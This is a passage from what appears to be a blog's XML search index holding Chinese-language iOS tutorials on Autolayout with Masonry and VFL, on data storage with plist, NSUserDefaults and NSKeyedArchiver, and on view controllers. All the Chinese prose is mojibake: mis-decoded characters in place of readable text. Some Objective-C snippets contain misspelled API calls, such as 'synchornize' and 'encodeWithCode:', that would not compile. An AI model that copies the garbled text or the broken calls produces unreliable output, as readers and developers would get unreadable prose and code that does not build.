&lt;&lt; 4, é«˜åº¦è·Ÿéšçˆ¶æŽ§ä»¶é«˜åº¦è¿›è¡Œä¼¸ç¼© Autolayout2ä¸ªæ ¸å¿ƒæ¦‚å¿µ çº¦æŸ å°ºå¯¸çº¦æŸ widthçº¦æŸ heightçº¦æŸ ä½ç½®çº¦æŸ é—´è·çº¦æŸï¼ˆä¸Šä¸‹å·¦å³é—´è·ï¼‰ å‚ç…§ æ‰€æ·»åŠ çš„çº¦æŸè·Ÿå“ªä¸ªæŽ§ä»¶æœ‰å…³ï¼ˆç›¸å¯¹äºŽå“ªä¸ªæŽ§ä»¶æ¥è¯´ï¼‰ å¸¸è§å•è¯ Leading -&gt; Left -&gt; å·¦è¾¹ Trailing -&gt; Right -&gt; å³è¾¹ å®žçŽ°çº¦æŸåŠ¨ç”»12345[UIView animateWithDuration:2.0 animations:^&#123; self.topCos.constant += 250; // layoutIfNeeded:å¼ºåˆ¶æ›´æ–°æŽ§ä»¶(ä¼šæ›´æ–°å½“å‰æŽ§ä»¶å’Œæ‰€æœ‰å­æŽ§ä»¶) [self.view layoutIfNeeded]; &#125;]; è­¦å‘Šå’Œé”™è¯¯ UILabelå®žçŽ°åŒ…è£¹å†…å®¹ è®¾ç½®å®½åº¦çº¦æŸä¸º &lt;= å›ºå®šå€¼ è®¾ç½®ä½ç½®çº¦æŸ ä¸ç”¨åŽ»è®¾ç½®é«˜åº¦çº¦æŸ å¼€å‘ä¸­èƒ½ç”¨åˆ°çš„å°æŠ€å·§ æœ‰æ—¶å€™ä¹Ÿä¼šçº¦æŸæŸå‡ ä¸ªæŽ§ä»¶çš„ä½ç½®å’Œå®½é«˜åœ¨å±å¹•ä¸­çš„ä½ç½®ç­‰é—´è·ä¸å˜ æ­¤æ—¶éœ€è¦åœ¨è¿™äº›æŽ§ä»¶ä¸­é—´æ·»åŠ å ä½æŽ§ä»¶å¹¶è®¾ç½®hiddenå±žæ€§ä¸ºyeså³å¯ é’è‰²çš„æŽ§ä»¶è®¾ç½®: ç¬¬ä¸€ä¸ªé’è‰²æŽ§ä»¶è‡ªèº«çš„å®½é«˜ä»¥åŠå’Œé¡¶éƒ¨æˆ–è€…åº•éƒ¨çš„é—´éš™ ç¬¬äºŒä¸ªé’è‰²æŽ§ä»¶å’Œç¬¬ä¸€ä¸ªé¡¶éƒ¨æˆ–è€…åº•éƒ¨æ°´å¹³ å®½é«˜å°ºå¯¸ä¹Ÿç›¸åŒ ç°è‰²çš„ä¸ºå ä½æŽ§ä»¶ è®¾ç½® : å·¦å³é—´éš™å‡ä¸º0 é«˜åº¦éšä¾¿å›ºå®šä¸€ä¸ªå€¼ (å®½åº¦ä¸è¦è®¾ç½®) è·ç¦»é¡¶éƒ¨æˆ–è€…åº•éƒ¨çš„é—´éš™ å…¶ä»–ä¸¤ä¸ªæŽ§ä»¶å’Œç¬¬ä¸€ä¸ªæŽ§ä»¶çš„é¡¶æˆ–è€…åº•éƒ¨å¯¹é½ å®½åº¦ç›¸åŒ(é«˜åº¦éšæ„) è®¾ç½®éšè—å±žæ€§ä¸ºyes MasonryåŸºæœ¬ä½¿ç”¨å¤´æ–‡ä»¶çš„å®å®šä¹‰12345678910//define this constant if you want to use Masonry without the 'mas_' prefix// åªè¦åœ¨å¯¼å…¥Masonryä¸»å¤´æ–‡ä»¶ä¹‹å‰å®šä¹‰è¿™ä¸ªå®, é‚£ä¹ˆä»¥åŽåœ¨ä½¿ç”¨Masonryæ¡†æž¶ä¸­çš„å±žæ€§å’Œæ–¹æ³•çš„æ—¶å€™, å°±å¯ä»¥çœç•¥mas_å‰ç¼€// å¦‚æžœè¿™ä¸ªå®æ˜¯åœ¨å¯¼å…¥äº†Masonry.hä¹‹åŽå®šä¹‰, é‚£ä¹ˆæ— æ•ˆ#define MAS_SHORTHAND//define this constant if you want to enable auto-boxing for default syntax// åªè¦åœ¨å¯¼å…¥Masonryä¸»å¤´æ–‡ä»¶ä¹‹å‰å®šä¹‰è¿™ä¸ªå®,é‚£ä¹ˆå°±å¯ä»¥è®©equalToå‡½æ•°æŽ¥æ”¶åŸºæœ¬æ•°æ®ç±»åž‹, å†…éƒ¨ä¼šå¯¹åŸºæœ¬æ•°æ®ç±»åž‹è¿›è¡ŒåŒ…è£…#define MAS_SHORTHAND_GLOBALS#import "Masonry.h" æ·»åŠ çº¦æŸæ–¹å¼1 (æŽ¨èçš„å†™æ³• å¯è§†åŒ–æ¯”è¾ƒå¥½)12345[blueView makeConstraints:^(MASConstraintMaker *make) &#123; make.top.equalTo(self.view.top).offset(20); // y make.left.equalTo(self.view.left).offset(20); // x make.right.equalTo(self.view.right).offset(-20); // w make.height.equalTo(50); // h æ–¹å¼2(æœ‰mas_å‰ç¼€)12345678[redView makeConstraints:^(MASConstraintMaker *make) &#123; // make.top.equalTo(self.view.mas_top).with.offset(20); make.top.equalTo(self.view.top).with.offset(20); make.left.equalTo(self.view.mas_left).offset(20); make.width.and.height.equalTo(@100); make.width.and.height.mas_equalTo(100); make.width.and.height.equalTo(100); &#125;]; ä¸æŽ¨èçš„å†™æ³•(å¯è§†åŒ–æ¯”è¾ƒå·®)123456[redView mas_makeConstraints:^(MASConstraintMaker *make) &#123; make.top.offset(20); make.left.offset(20); make.bottom.offset(-20); make.right.offset(-20); &#125;]; 123[redView mas_makeConstraints:^(MASConstraintMaker *make) &#123; make.edges.insets(UIEdgeInsetsMake(20, 20, 20, 20)); &#125;]; çº¦æŸçš„å…¶ä»–å¸¸è§æ³¨æ„ç‚¹ çº¦æŸçš„æ·»åŠ  1234// makeConstraints: æ¯æ¬¡éƒ½ä¼šæ·»åŠ æ–°çš„çº¦æŸ[self.redView makeConstraints:^(MASConstraintMaker *make) &#123; make.top.equalTo(self.blueView.bottom).offset(100); &#125;]; çº¦æŸçš„update 1234// updateConstraints:ä¸“é—¨ç”¨äºŽæ›´æ–°çº¦æŸçš„,å¦‚æžœæ²¡æœ‰çº¦æŸä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ å¦‚æžœæœ‰ç›´æŽ¥ä¿®æ”¹ä»¥å‰çš„ [self.redView updateConstraints:^(MASConstraintMaker *make) &#123; make.top.equalTo(self.blueView.bottom).offset(100); &#125;]; çº¦æŸçš„æ¸…ç©º 1234// remakeConstraints: æ¸…ç©ºçº¦æŸ, åˆ é™¤çº¦æŸ [self.redView remakeConstraints:^(MASConstraintMaker *make) &#123; &#125;]; VFL VisualFormatLanguage: å¯è§†åŒ–è§„æ ¼è¯­è¨€ã€‚æ³¨æ„ç‚¹ å¦‚æžœæ˜¯é€šè¿‡ä»£ç æ·»åŠ Autolayout,é‚£ä¹ˆå¿…é¡»åœ¨æ·»åŠ çº¦æŸä¹‹å‰ç¦ç”¨Autoresizing ç¦ç”¨Autoresizingæ—¶,å¿…é¡»æ˜¯ç»™è°æ·»åŠ å°±ç¦ç”¨è°çš„,ä¹Ÿå°±æ˜¯è¯´å¦‚æžœç¦ç”¨äº†çˆ¶æŽ§ä»¶æ— æ•ˆ æ·»åŠ çº¦æŸä¹‹å‰,å¿…é¡»ä¿è¯è¢«çº¦æŸçš„æŽ§ä»¶å·²ç»æ·»åŠ åˆ°çˆ¶æŽ§ä»¶ä¸­äº† 12self.view.translatesAutoresizingMaskIntoConstraints = NO;redView.translatesAutoresizingMaskIntoConstraints = NO; é€šè¿‡VFLæ·»åŠ çº¦æŸåŸºæœ¬ä½¿ç”¨1234567891011121314 /* VisualFormat: VFLè¯­å¥ options: å¯¹é½æ–¹å¼ metrics: å ä½å­—ç¬¦å¯¹åº”çš„å€¼ views: å ä½å­—ç¬¦å¯¹åº”çš„æŽ§ä»¶*/ // è®¾ç½®æ°´å¹³æ–¹å‘çš„çº¦æŸ NSDictionary *dict = NSDictionaryOfVariableBindings(redView); NSArray *hCos = [NSLayoutConstraint constraintsWithVisualFormat:@"H:|-20-[redView(w)]" options:kNilOptions metrics:@&#123;@"w":@100&#125; views:dict]; [self.view addConstraints:hCos]; // è®¾ç½®åž‚ç›´æ–¹å‘çš„çº¦æŸ NSArray *vCos = [NSLayoutConstraint constraintsWithVisualFormat:@"V:|-20-[redView(h)]" options:kNilOptions metrics:@&#123;@"h":@100&#125; views:@&#123;@"redView":redView&#125;]; [self.view addConstraints:vCos]; æ³¨æ„ç‚¹ VFLè¯­å¥ä¸­ä¸æ”¯æŒä¹˜é™¤æ³• æ­¤æ—¶è¿˜æ˜¯éœ€è¦ç”¨æœ€åŽŸå§‹çš„æ–¹æ³•(ä»£ç )æ¥åš 123456789101112/* Item == ç¬¬ä¸€ä¸ªæŽ§ä»¶ attribute == ç¬¬ä¸€ä¸ªæŽ§ä»¶çš„ä»€ä¹ˆå±žæ€§ relatedBy == ç­‰äºŽ/å°äºŽç­‰äºŽ/å¤§äºŽç­‰äºŽ toItem == ç¬¬äºŒä¸ªæŽ§ä»¶ attribute == ç¬¬äºŒä¸ªæŽ§ä»¶çš„ä»€ä¹ˆå±žæ€§ multiplier == ä¹˜ä»¥å¤šå°‘ constant == åŠ ä¸Šå¤šå°‘*/NSLayoutConstraint *redWidth = [NSLayoutConstraint constraintWithItem:redView attribute:NSLayoutAttributeWidth relatedBy:NSLayoutRelationEqual toItem:blueView attribute:NSLayoutAttributeWidth multiplier:0.5 constant:0.0];[self.view addConstraint:redWidth];]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Autoresizing</tag>
        <tag>Autolayout</tag>
        <tag>Sizeclass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹å¸¸ç”¨æ•°æ®å­˜å‚¨æ–¹å¼]]></title>
    <url>%2Farchives%2F3c64aa6c.html</url>
    <content type="text"><![CDATA[é”¦ç‘Ÿæ— ç«¯äº”åå¼¦ï¼Œä¸€å¼¦ä¸€æŸ±æ€åŽå¹´ã€‚åº„ç”Ÿæ™“æ¢¦è¿·è´è¶ï¼Œæœ›å¸æ˜¥å¿ƒæ‰˜æœé¹ƒã€‚æ²§æµ·æœˆæ˜Žç æœ‰æ³ªï¼Œè“ç”°æ—¥æš–çŽ‰ç”ŸçƒŸã€‚æ­¤æƒ…å¯å¾…æˆè¿½å¿†ï¼Œåªæ˜¯å½“æ—¶å·²æƒ˜ç„¶ã€‚ æŽå•†éš ã€Šé”¦ç‘Ÿã€‹ æ•°æ®å­˜å‚¨ æ•°æ®å­˜å‚¨çš„å‡ ç§å¸¸è§æ–¹å¼ XMLå±žæ€§åˆ—è¡¨ï¼ˆplistï¼‰å½’æ¡£ Preference(åå¥½è®¾ç½®) NSKeyedArchiverå½’æ¡£(NSCoding) SQLite3(æ‰‹æœºä¸Šè¿è¡Œçš„å¾®åž‹æ•°æ®åº“é€‚åˆæ•°æ®é‡å¤§çš„æ—¶å€™è°ƒç”¨) Core Data (appleå…¬å¸å°è£…çš„ å¯ä»¥ä¸ç”¨å†™æ•°æ®åº“ä»£ç  ä½†æ˜¯è‡ªåŠ¨çš„éƒ½æ˜¯å†…å­˜ä¸å¤Ÿä¼˜åŒ–) XMLå±žæ€§åˆ—è¡¨ï¼ˆplistï¼‰å½’æ¡£ å°†æ–‡ä»¶é€šè¿‡ä¸åŒçš„æ–¹å¼å†™å…¥åˆ°æ²™ç›’çš„ä¸åŒç›®å½•ä¸‹ã€‚ åº”ç”¨æ²™ç›’ç›®å½•çš„å¸¸è§èŽ·å–æ–¹å¼æ²™ç›’æ ¹ç›®å½•ï¼š1NSString *home = NSHomeDirectory(); èŽ·å–Dcumentsè·¯å¾„ï¼š(2ç§æ–¹å¼) æ–¹å¼1ï¼šåˆ©ç”¨æ²™ç›’æ ¹ç›®å½•æ‹¼æŽ¥â€Documentsâ€å­—ç¬¦ä¸²ã€‚ æ­¤æ–¹å¼ä¸å»ºè®®é‡‡ç”¨ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿå¯èƒ½ä¼šä¿®æ”¹ç›®å½•åã€‚ 12NSString *home = NSHomeDirectory();NSString *documents = [home stringByAppendingPathComponent:@"Documents"]; æ–¹å¼2ï¼šåˆ©ç”¨NSSearchPathForDirectoriesInDomainså‡½æ•° NSUserDomainMask ä»£è¡¨ä»Žç”¨æˆ·æ–‡ä»¶å¤¹ä¸‹æ‰¾ YES ä»£è¡¨å±•å¼€è·¯å¾„ä¸­çš„æ³¢æµªå­—ç¬¦â€œ~â€ 1234NSArray *array = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, NO);// åœ¨iOSä¸­ï¼Œåªæœ‰ä¸€ä¸ªç›®å½•è·Ÿä¼ å…¥çš„å‚æ•°åŒ¹é…ï¼Œæ‰€ä»¥è¿™ä¸ªé›†åˆé‡Œé¢åªæœ‰ä¸€ä¸ªå…ƒç´ NSString *documents = [array objectAtIndex:0];tmpï¼šNSString *tmp = NSTemporaryDirectory(); èŽ·å–Library/Cachesè·¯å¾„ï¼š(è·ŸDocumentsç±»ä¼¼çš„2ç§æ–¹æ³•) æ–¹å¼1ï¼šåˆ©ç”¨æ²™ç›’æ ¹ç›®å½•æ‹¼æŽ¥Cacheså­—ç¬¦ä¸² æ–¹å¼2ï¼šåˆ©ç”¨NSSearchPathForDirectoriesInDomainså‡½æ•°(å°†å‡½æ•°çš„ç¬¬2ä¸ªå‚æ•°æ”¹ä¸ºï¼šNSCachesDirectoryå³å¯) Library/Preference é€šè¿‡NSUserDefaultsç±»å­˜å–è¯¥ç›®å½•ä¸‹çš„è®¾ç½®ä¿¡æ¯ å±žæ€§åˆ—è¡¨æ˜¯ä¸€ç§XMLæ ¼å¼çš„æ–‡ä»¶ï¼Œæ‹“å±•åä¸ºplistï¼Œå¦‚æžœå¯¹è±¡æ˜¯NSStringã€NSDictionaryã€NSArrayã€NSDataã€NSNumberç­‰ç±»åž‹ï¼Œå°±å¯ä»¥ä½¿ç”¨writeToFile:atomically:æ–¹æ³•ç›´æŽ¥å°†å¯¹è±¡å†™åˆ°å±žæ€§åˆ—è¡¨æ–‡ä»¶ä¸­ å±žæ€§åˆ—è¡¨-å½’æ¡£NSDictionary å°†ä¸€ä¸ªNSDictionaryå¯¹è±¡å½’æ¡£åˆ°ä¸€ä¸ªplistå±žæ€§åˆ—è¡¨ä¸­ 1234567// å°†æ•°æ®å°è£…æˆå­—å…¸NSMutableDictionary *dict = [NSMutableDictionary dictionary];[dict setObject:@"æ¯é¸¡" forKey:@"name"];[dict setObject:@"15013141314" forKey:@"phone"];[dict setObject:@"27" forKey:@"age"];// å°†å­—å…¸æŒä¹…åŒ–åˆ°Documents/stu.plistæ–‡ä»¶ä¸­[dict writeToFile:path atomically:YES]; å±žæ€§åˆ—è¡¨-æ¢å¤NSDictionary è¯»å–å±žæ€§åˆ—è¡¨ï¼Œæ¢å¤NSDictionaryå¯¹è±¡ 12345// è¯»å–Documents/stu.plistçš„å†…å®¹ï¼Œå®žä¾‹åŒ–NSDictionaryNSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:path];NSLog(@"name:%@", [dict objectForKey:@"name"]);NSLog(@"phone:%@", [dict objectForKey:@"phone"]);NSLog(@"age:%@", [dict objectForKey:@"age"]); åå¥½è®¾ç½® å¾ˆå¤šiOSåº”ç”¨éƒ½æ”¯æŒåå¥½è®¾ç½®ï¼Œæ¯”å¦‚ä¿å­˜ç”¨æˆ·åã€å¯†ç ã€å­—ä½“å¤§å°ç­‰è®¾ç½®ï¼ŒiOSæä¾›äº†ä¸€å¥—æ ‡å‡†çš„è§£å†³æ–¹æ¡ˆæ¥ä¸ºåº”ç”¨åŠ å…¥åå¥½è®¾ç½®åŠŸèƒ½ã€‚ æ¯ä¸ªåº”ç”¨éƒ½æœ‰ä¸ªNSUserDefaultså®žä¾‹ï¼Œé€šè¿‡å®ƒæ¥å­˜å–åå¥½è®¾ç½®ï¼Œæ¯”å¦‚ï¼Œä¿å­˜ç”¨æˆ·åã€å­—ä½“å¤§å°ã€æ˜¯å¦è‡ªåŠ¨ç™»å½•ã€‚ 12345678910NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];[defaults setObject:@"è¥¿é—¨æŠ½ç­‹" forKey:@"username"];[defaults setFloat:18.0f forKey:@"text_size"];[defaults setBool:YES forKey:@"auto_login"];// è¯»å–ä¸Šæ¬¡ä¿å­˜çš„è®¾ç½®NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];NSString *username = [defaults stringForKey:@"username"];float textSize = [defaults floatForKey:@"text_size"];BOOL autoLogin = [defaults boolForKey:@"auto_login"]; æ³¨æ„ UserDefaultsè®¾ç½®æ•°æ®æ—¶ï¼Œä¸æ˜¯ç«‹å³å†™å…¥ï¼Œè€Œæ˜¯æ ¹æ®æ—¶é—´æˆ³å®šæ—¶åœ°æŠŠç¼“å­˜ä¸­çš„æ•°æ®å†™å…¥æœ¬åœ°ç£ç›˜ã€‚ æ‰€ä»¥è°ƒç”¨äº†setæ–¹æ³•ä¹‹åŽæ•°æ®æœ‰å¯èƒ½è¿˜æ²¡æœ‰å†™å…¥ç£ç›˜åº”ç”¨ç¨‹åºå°±ç»ˆæ­¢äº†ã€‚å‡ºçŽ°ä»¥ä¸Šé—®é¢˜ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨synchornizeæ–¹æ³•å¼ºåˆ¶å†™å…¥ã€‚ 1[defaults synchornize]; NSKeyedArchiver å¦‚æžœå¯¹è±¡æ˜¯NSStringã€NSDictionaryã€NSArrayã€NSDataã€NSNumberç­‰ç±»åž‹ï¼Œå¯ä»¥ç›´æŽ¥ç”¨NSKeyedArchiverè¿›è¡Œå½’æ¡£å’Œæ¢å¤ã€‚ ä¸æ˜¯æ‰€æœ‰çš„å¯¹è±¡éƒ½å¯ä»¥ç›´æŽ¥ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œå½’æ¡£ï¼Œåªæœ‰éµå®ˆäº†NSCodingåè®®çš„å¯¹è±¡æ‰å¯ä»¥ã€‚ NSCodingåè®®æœ‰2ä¸ªæ–¹æ³•ï¼š encodeWithCoder: æ¯æ¬¡å½’æ¡£å¯¹è±¡æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ ä¸€èˆ¬åœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢æŒ‡å®šå¦‚ä½•å½’æ¡£å¯¹è±¡ä¸­çš„æ¯ä¸ªå®žä¾‹å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨encodeObject:forKey:æ–¹æ³•å½’æ¡£å®žä¾‹å˜é‡ initWithCoder: æ¯æ¬¡ä»Žæ–‡ä»¶ä¸­æ¢å¤(è§£ç )å¯¹è±¡æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ ä¸€èˆ¬åœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢æŒ‡å®šå¦‚ä½•è§£ç æ–‡ä»¶ä¸­çš„æ•°æ®ä¸ºå¯¹è±¡çš„å®žä¾‹å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨decodeObject:forKeyæ–¹æ³•è§£ç å®žä¾‹å˜é‡ å½’æ¡£ä¸€ä¸ªNSArrayå¯¹è±¡ å°†ä¸€ä¸ªä¸€ä¸ªNSArrayå¯¹è±¡å½’æ¡£åˆ°Documents/array.archiveç›®å½•ä¸‹ã€‚ 12NSArray *array = [NSArray arrayWithObjects:@â€aâ€,@â€bâ€,nil];[NSKeyedArchiver archiveRootObject:array toFile:path]; å½’æ¡£(ç¼–ç )12345Person *person = [[[Person alloc] init] autorelease];person.name = @"è¥¿é—¨æŠ½ç­‹";person.age = 27;person.height = 1.83f;[NSKeyedArchiver archiveRootObject:person toFile:path]; æ¢å¤(è§£ç )1Person *person = [NSKeyedUnarchiver unarchiveObjectWithFile:path]; NSKeyedArchiverå½’æ¡£å¯¹è±¡çš„æ³¨æ„ å¦‚æžœçˆ¶ç±»ä¹Ÿéµå®ˆäº†NSCodingåè®®ï¼Œè¯·æ³¨æ„ï¼šåº”è¯¥åœ¨encodeWithCoder:æ–¹æ³•ä¸­åŠ ä¸Šä¸‹é¢ä»£ç ç¡®ä¿ç»§æ‰¿çš„å®žä¾‹å˜é‡ä¹Ÿèƒ½è¢«ç¼–ç ï¼Œå³ä¹Ÿèƒ½è¢«å½’æ¡£ 1[super encodeWithCode:encode]; åº”è¯¥åœ¨initWithCoder:æ–¹æ³•ä¸­åŠ ä¸Šä¸‹é¢ä»£ç ç¡®ä¿ç»§æ‰¿çš„å®žä¾‹å˜é‡ä¹Ÿèƒ½è¢«è§£ç ï¼Œå³ä¹Ÿèƒ½è¢«æ¢å¤ 1self = [super initWithCoder:decoder]; NSData ä½¿ç”¨archiveRootObject:toFile:æ–¹æ³•å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡ç›´æŽ¥å†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä½†æœ‰æ—¶å€™å¯èƒ½æƒ³å°†å¤šä¸ªå¯¹è±¡å†™å…¥åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆå°±è¦ä½¿ç”¨NSDataæ¥è¿›è¡Œå½’æ¡£å¯¹è±¡ã€‚ NSDataå¯ä»¥ä¸ºä¸€äº›æ•°æ®æä¾›ä¸´æ—¶å­˜å‚¨ç©ºé—´ï¼Œä»¥ä¾¿éšåŽå†™å…¥æ–‡ä»¶ï¼Œæˆ–è€…å­˜æ”¾ä»Žç£ç›˜è¯»å–çš„æ–‡ä»¶å†…å®¹ã€‚å¯ä»¥ä½¿ç”¨[NSMutableData data]åˆ›å»ºå¯å˜æ•°æ®ç©ºé—´ã€‚ å½’æ¡£ï¼ˆç¼–ç ï¼‰12345678910111213// æ–°å»ºä¸€å—å¯å˜æ•°æ®åŒºNSMutableData *data = [NSMutableData data];// å°†æ•°æ®åŒºè¿žæŽ¥åˆ°ä¸€ä¸ªNSKeyedArchiverå¯¹è±¡NSKeyedArchiver *archiver = [[[NSKeyedArchiver alloc] initForWritingWithMutableData:data] autorelease];// å¼€å§‹å­˜æ¡£å¯¹è±¡ï¼Œå­˜æ¡£çš„æ•°æ®éƒ½ä¼šå­˜å‚¨åˆ°NSMutableDataä¸­[archiver encodeObject:person1 forKey:@"person1"];[archiver encodeObject:person2 forKey:@"person2"];// å­˜æ¡£å®Œæ¯•(ä¸€å®šè¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•)[archiver finishEncoding];// å°†å­˜æ¡£çš„æ•°æ®å†™å…¥æ–‡ä»¶[data writeToFile:path atomically:YES]; æ¢å¤ï¼ˆè§£ç ï¼‰12345678910// ä»Žæ–‡ä»¶ä¸­è¯»å–æ•°æ®NSData *data = [NSData dataWithContentsOfFile:path];// æ ¹æ®æ•°æ®ï¼Œè§£æžæˆä¸€ä¸ªNSKeyedUnarchiverå¯¹è±¡NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:data];Person *person1 = [unarchiver decodeObjectForKey:@"person1"];Person *person2 = [unarchiver decodeObjectForKey:@"person2"];// æ¢å¤å®Œæ¯•[unarchiver finishDecoding]; å…¶ä»– å…³äºŽSQLite3 å’Œ Core Dataçš„å­˜å‚¨æ–¹å¼ã€‚ä¸€èˆ¬åœ¨å¼€å‘ä¸­å›½å†…ä½¿ç”¨SQLite3æ¯”è¾ƒå¤šï¼Œå…·ä½“çš„ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹å¸¸ç”¨æŽ§åˆ¶å™¨åŠå¤šæŽ§åˆ¶å™¨ç®¡ç†]]></title>
    <url>%2Farchives%2Fc2b85789.html</url>
    <content type="text"><![CDATA[è¿œä¹¦å½’æ¢¦ä¸¤æ‚ æ‚ ï¼Œåªæœ‰ç©ºåºŠæ•Œç´ ç§‹ã€‚é˜¶ä¸‹é’è‹”ä¸Žçº¢æ ‘ï¼Œé›¨ä¸­å¯¥è½æœˆä¸­æ„ã€‚ æŽå•†éš ã€Šç«¯å±…ã€‹ æŽ§åˆ¶å™¨æŽ§åˆ¶å™¨Viewçš„åŠ è½½ æŽ§åˆ¶å™¨çš„ç”Ÿå‘½å‘¨æœŸ å†…å­˜è­¦å‘Šçš„æ—¶å€™çš„æ•´ä¸ªå¾ªçŽ¯çš„æµç¨‹å›¾ æŽ§åˆ¶å™¨å¸¸è§çš„åˆ›å»ºæ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§é€šè¿‡storyboardåˆ›å»º å…ˆåŠ è½½storyboardæ–‡ä»¶ï¼ˆTestæ˜¯storyboardçš„æ–‡ä»¶åï¼‰ 1UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Test" bundle:nil]; æŽ¥ç€åˆå§‹åŒ–storyboardä¸­çš„æŽ§åˆ¶å™¨ åˆå§‹åŒ–â€œåˆå§‹æŽ§åˆ¶å™¨â€ï¼ˆç®­å¤´æ‰€æŒ‡çš„æŽ§åˆ¶å™¨ï¼‰ 1XSViewController *vc = [storyboard instantiateInitialViewController]; 12 // é€šè¿‡ä¸€ä¸ªæ ‡è¯†åˆå§‹åŒ–å¯¹åº”çš„æŽ§åˆ¶å™¨XSViewController *XS = [storyboard instantiateViewControllerWithIdentifier:@â€vc"]; ç›´æŽ¥åˆ›å»º1XSViewController *XS = [[XSViewController alloc] init]; æŒ‡å®šxibæ–‡ä»¶æ¥åˆ›å»º123456789101112 // é€šè¿‡Xibåˆ›å»ºçš„æŽ§åˆ¶å™¨// é€šè¿‡xibåŽ»åŠ è½½æŽ§åˆ¶å™¨// 1.é¦–å…ˆåˆ›å»ºä¸€ä¸ªXibæ–‡ä»¶// 2.Xibæ–‡ä»¶éœ€è¦æ‹–ä¸€ä¸ªViewæè¿°æŽ§åˆ¶å™¨çš„View// 3.éœ€è¦æŠŠXibä¸Šçš„Viewä¸ŽæŽ§åˆ¶å™¨è¿žçº¿ï¼Œè®¾ç½®Xibçš„File'ownerä¸ºæŽ§åˆ¶å™¨ViewController *vc = [[ViewController alloc] initWithNibName:@"VC" bundle:nil];// åˆ›å»ºæ ¹æŽ§åˆ¶å™¨XSViewController *vc = [[XSViewController alloc] init];// initåº•å±‚ä¼šè‡ªåŠ¨è°ƒç”¨initWithNibName å‡è®¾é€šè¿‡Xibåˆ›å»ºXSViewControlleræŽ§åˆ¶å™¨å¯¹è±¡ å¦‚æžœnibNameä¸ºnil,é¦–å…ˆä¼šåŽ»æŸ¥æ‰¾XSView.xib,å¦‚æžœæœ‰ï¼Œå°±ä¼šåŽ»åŠ è½½XSView.xibæè¿°çš„æŽ§åˆ¶å™¨çš„view å¦‚æžœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¼šåŽ»æ‰¾XSViewController.xib,å¦‚æžœæœ‰ï¼Œä¹Ÿä¼šåŽ»åŠ è½½ éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„view ç©ºçš„viewæ˜¯å‡ ä¹Žé€æ˜Žçš„,ä½†ä¸æ˜¯å®Œå…¨é€æ˜Žçš„ ç›¸å½“äºŽ[UIColor clearColor];å¯ä»¥ç©¿é€è¿‡åŽ»,ä½†æ˜¯å®Œå…¨é€æ˜Žå°±ä¸èƒ½å¤Ÿç©¿é€ æŽ§åˆ¶å™¨çš„viewæ˜¯å»¶è¿ŸåŠ è½½çš„ï¼šç”¨åˆ°æ—¶å†åŠ è½½UIView(åªç”¨äºŽUIViewControlleræˆ–è€…å­æŽ§åˆ¶å™¨) å¯ä»¥ç”¨isViewLoadedæ–¹æ³•åˆ¤æ–­ä¸€ä¸ªUIViewControllerçš„viewæ˜¯å¦å·²ç»è¢«åŠ è½½ æŽ§åˆ¶å™¨çš„viewåŠ è½½å®Œæ¯•å°±ä¼šè°ƒç”¨viewDidLoadæ–¹æ³• UINavigationController ä¸ºäº†ä¾¿äºŽç®¡ç†æŽ§åˆ¶å™¨ï¼ŒiOSæä¾›äº†2ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æŽ§åˆ¶å™¨ 12UINavigationController(å¯¼èˆªæŽ§åˆ¶å™¨)UITabBarController(QQ,å¾®ä¿¡,æ·˜å®ç­‰) UINavigationControllerçš„ä½¿ç”¨æ­¥éª¤ åˆå§‹åŒ–UINavigationController è®¾ç½®UIWindowçš„rootViewControllerä¸ºUINavigationController æ ¹æ®å…·ä½“æƒ…å†µï¼Œé€šè¿‡pushæ–¹æ³•æ·»åŠ å¯¹åº”ä¸ªæ•°çš„å­æŽ§åˆ¶å™¨ UINavigationControllerçš„å­æŽ§åˆ¶å™¨ UINavigationController ä»¥æ ˆçš„å½¢å¼ä¿å­˜å­æŽ§åˆ¶å™¨ 12@property(nonatomic,copy) NSArray *viewControllers;@property(nonatomic,readonly) NSArray *childViewControllers; æŽ§åˆ¶å™¨å‡ºå…¥æ ˆçš„å¸¸ç”¨çš„é›†ä¸­æ–¹æ³•12345678// ä½¿ç”¨pushæ–¹æ³•èƒ½å°†æŸä¸ªæŽ§åˆ¶å™¨åŽ‹å…¥æ ˆ- (void)pushViewController:(UIViewController *)viewController animated:(BOOL)animated;// ä½¿ç”¨popæ–¹æ³•å¯ä»¥ç§»é™¤æŽ§åˆ¶å™¨ å°†æ ˆé¡¶çš„æŽ§åˆ¶å™¨ç§»é™¤- (UIViewController 